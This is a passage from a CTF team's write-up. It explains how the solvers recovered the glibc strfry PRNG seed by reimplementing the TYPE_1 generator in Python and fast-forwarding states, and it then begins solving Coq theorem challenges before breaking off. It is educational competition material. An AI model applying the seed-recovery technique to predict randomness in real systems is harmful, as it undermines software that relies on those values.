&lt;h3 id=&#34;challenge-summary-1&#34;&gt;Challenge Summary&lt;/h3&gt;

&lt;p&gt;The challenge is simple. Upon connecting to the challenge server,&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;257 HEX characters are generated, &lt;code&gt;strfry&lt;/code&gt;-ed for &lt;code&gt;0x140000&lt;/code&gt; times. Nothing is returned. (&lt;em&gt;This took around 5 seconds&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;Players are allowed to send up to 4096 bytes. The server returns the &lt;code&gt;strfry&lt;/code&gt;-ed input.&lt;/li&gt;
&lt;li&gt;64 HEX characters (denote as &lt;code&gt;fry_buf&lt;/code&gt;) &lt;code&gt;strfry&lt;/code&gt;-ed and returned.&lt;/li&gt;
&lt;li&gt;The player is expected to find &lt;code&gt;fry_buf&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;More importantly, the challenge server has a timeout of 20 seconds. Hence, you have to compute from the &lt;code&gt;strfry&lt;/code&gt;-ed response in 15 seconds.&lt;/p&gt;

&lt;h3 id=&#34;solution-1&#34;&gt;Solution&lt;/h3&gt;

&lt;h4 id=&#34;part-i-the-first-encounter&#34;&gt;Part I: The first encounter&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;&amp;quot;WTF. Yet another &lt;code&gt;strfry&lt;/code&gt; question? It must be very boring.&amp;quot; ~ &lt;em&gt;Mystiz&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This is the first comment I made to the challenge. It is actually much interesting than I thought and I have spent a good 5 hours for the challenge.&lt;/p&gt;

&lt;p&gt;The previous CTFs (for example, challenge from &lt;a href=&#34;https://ctftime.org/task/10764&#34;&gt;ångstromCTF 2020&lt;/a&gt; and &lt;a href=&#34;https://ctftime.org/task/11259&#34;&gt;DawgCTF 2020&lt;/a&gt;) exploited on the small seed space that can be exhausted. In the previous versions of libc, the seeds for &lt;code&gt;strfry&lt;/code&gt; is given by &lt;code&gt;time(NULL) ^ getpid()&lt;/code&gt;. I was trying to print &lt;code&gt;time(NULL)&lt;/code&gt; and &lt;code&gt;getpid()&lt;/code&gt; alongside with the  &lt;code&gt;strfry&lt;/code&gt; result, but the seed does not check out. What? Maybe the world is not peaceful anymore in &lt;em&gt;libc 2.31-0ubuntu9&lt;/em&gt;. Let&#39;s download the source code and have a read.&lt;/p&gt;

&lt;h4 id=&#34;part-ii-codereading-game&#34;&gt;Part II: Code-reading game&lt;/h4&gt;

&lt;p&gt;Let&#39;s verify the first point - is the implementation for &lt;code&gt;strfry&lt;/code&gt; changed?&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// string/strfry.c
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;strfry&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;string)
{
  &lt;span style=&#34;color:#75715e&#34;&gt;// omitted...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;init)
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; state[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;];
      rdata.state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
      __initstate_r (random_bits (),
		     state, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt; (state), &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;rdata);
      init &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
  &lt;span style=&#34;color:#75715e&#34;&gt;// omitted...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// include/random-bits.h
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;inline&lt;/span&gt; uint32_t
&lt;span style=&#34;color:#a6e22e&#34;&gt;random_bits&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; timespec tv;
  __clock_gettime (CLOCK_MONOTONIC, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;tv);
  &lt;span style=&#34;color:#75715e&#34;&gt;/* Shuffle the lower bits to minimize the clock bias.  */&lt;/span&gt;
  uint32_t ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tv.tv_nsec &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; tv.tv_sec;
  ret &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; (ret &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (ret &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ret;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Although the string is fried in the same way, the seed is changed! Since the seed is 32 bits long, maybe I can just exhaust it. However it takes 5 seconds to &lt;code&gt;strfry&lt;/code&gt; a 257-byte long string for 0x140000 times, it is not feasible to brute force with the challenge implementation. Let&#39;s read how random numbers are generated.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// stdlib/random_r.c
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;__initstate_r&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; seed, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;arg_state, size_t n,
	       &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; random_data &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf)
{
  &lt;span style=&#34;color:#75715e&#34;&gt;// omitted...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; type;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; BREAK_3)
    type &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; BREAK_4 &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; TYPE_3 : TYPE_4;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; BREAK_1)
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; BREAK_0)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; fail;

      type &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; TYPE_0;
    }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    type &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; BREAK_2 &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; TYPE_1 : TYPE_2;

  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; degree &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random_poly_info.degrees[type];
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; separation &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random_poly_info.seps[type];

  buf&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;rand_type &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; type;
  buf&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;rand_sep &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; separation;
  buf&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;rand_deg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; degree;
  int32_t &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;((int32_t &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) arg_state)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];	&lt;span style=&#34;color:#75715e&#34;&gt;/* First location.  */&lt;/span&gt;
  &lt;span style=&#34;color:#75715e&#34;&gt;/* Must set END_PTR before srandom.  */&lt;/span&gt;
  buf&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;end_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;state[degree];

  buf&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state;

  __srandom_r (seed, buf);

  state[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; TYPE_0;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (type &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; TYPE_0)
    state[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (buf&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;rptr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; state) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; MAX_TYPES &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; type;
  &lt;span style=&#34;color:#75715e&#34;&gt;// omitted...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;strfry&lt;/code&gt; uses a 32-byte state, which indicates that &lt;code&gt;TYPE_1&lt;/code&gt; PRNG is used. Seven 32-bit unsigned integer is derived from the seed (denote it as &lt;code&gt;s[0]&lt;/code&gt;, &lt;code&gt;s[1]&lt;/code&gt;, ..., &lt;code&gt;s[6]&lt;/code&gt;) and set the counter &lt;code&gt;c := 0&lt;/code&gt;. This is the equivalent Python code.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GlibcRandom&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, seed):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;init_state(seed)
        [self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;next() &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;)]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;init_state&lt;/span&gt;(self, seed):
        state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [seed]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;):
            h, l &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; seed &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127773&lt;/span&gt;, seed &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127773&lt;/span&gt;

            seed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;16807&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; l &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2836&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; h) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fffffff&lt;/span&gt;
            state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(seed)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
            state,
            &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        ]
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;(self):
        s, t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state
        v &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (s[(t&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; s[t &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff&lt;/span&gt;
        v &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;

        s[(t&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; s[t &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]
        s[(t&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff&lt;/span&gt;

        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [s, (t &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&#34;part-iii-fastforwarding-the-states&#34;&gt;Part III: Fast-forwarding the states&lt;/h4&gt;

&lt;p&gt;Fast-forwarding the PRNG is easy. This is similar on the &lt;a href=&#34;https://b6a.black/posts/2020-09-08-confidencectf-team-trees/#42-fast-sequence-generation&#34;&gt;Team Trees&lt;/a&gt; challenge in CONFidence CTF this year. We can skip states with the matrix implementation (and I am able to skip the details for this part, too). After all, 5M seeds can be checked per second. Since we have only 15 seconds to recover the seed, we are unable to find the entire search space (only 1.75% of the seed space is checked). In average, we can recover the seed from the &lt;code&gt;strfry&lt;/code&gt; output in 15 seconds once every 60 times. Finally, if we are able to recover the seed, we can freely fry and unfry strings.&lt;/p&gt;

&lt;p&gt;After two hours, we have the flag: &lt;code&gt;DrgnS{Fr13d_57r1Ng5_4r3_tH3_Be5t_s7r1NgS!}&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;babykok-misc-215-points&#34;&gt;babykok (Misc, 215 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;GeoffreyY&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;We simply have to solve some theorems using &lt;a href=&#34;https://coq.inria.fr/&#34;&gt;Coq&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Good thing I have written some &lt;a href=&#34;https://leanprover.github.io/&#34;&gt;lean&lt;/a&gt; before, so learning / writing Coq isn&#39;t that difficult.&lt;/p&gt;

&lt;p&gt;For the first part we have to solve the following 6 theorems in some random order.&lt;/p&gt;

&lt;p&gt;I&#39;d like to thank my teammate @ozetta for finding this powerful coq tactic &lt;code&gt;intuition&lt;/code&gt;, and @harrier_lcc for showing us his coq and how to use it.&lt;/p&gt;

&lt;div class=&#34;alert info&#34;&gt;
  This would&amp;rsquo;ve taken a lot longer if we didn&amp;rsquo;t watch him livestreaming playing around with his coq.
His coq is very very nah that&amp;rsquo;s it I&amp;rsquo;m done with the jokes.
&lt;/div&gt;
  
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-coq&#34; data-lang=&#34;coq&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;Theorem&lt;/span&gt; problem0&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; A B &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Prop&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; A &lt;span style=&#34;color:#f92672&#34;&gt;\/&lt;/span&gt; B &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; B &lt;span style=&#34;color:#f92672&#34;&gt;\/&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;intuition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-coq&#34; data-lang=&#34;coq&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;Theorem&lt;/span&gt; problem1&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; A B C D &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Prop&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;A &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; B&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/\&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;C &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; D&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/\&lt;/span&gt; A &lt;span style=&#34;color:#f92672&#34;&gt;/\&lt;/span&gt; C &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; B &lt;span style=&#34;color:#f92672&#34;&gt;/\&lt;/span&gt; D&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;intuition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-coq&#34; data-lang=&#34;coq&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;Theorem&lt;/span&gt; problem2&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; A B &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((((&lt;/span&gt;A &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; B&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; A&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; B&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; B&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;intuition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We actually have to do some work with the remaining 3 starter problems:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-coq&#34; data-lang=&#34;coq&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;Theorem&lt;/span&gt; problem3&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;forall&lt;/span&gt; b1 b2 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; negb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;b1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; b2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;negb b1 &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; negb b2&lt;span style=&#34;color:#f92672&#34;&gt;)%&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;intros&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 1 subgoal &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ID 10&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

  b1&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; b2 &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;============================&lt;/span&gt;
  negb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;b1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; b2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;negb b1 &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; negb b2&lt;span style=&#34;color:#f92672&#34;&gt;)%&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The general idea for all of these proofs is to apply &lt;code&gt;induction&lt;/code&gt; to split the proof into smaller, simple cases.&lt;/p&gt;
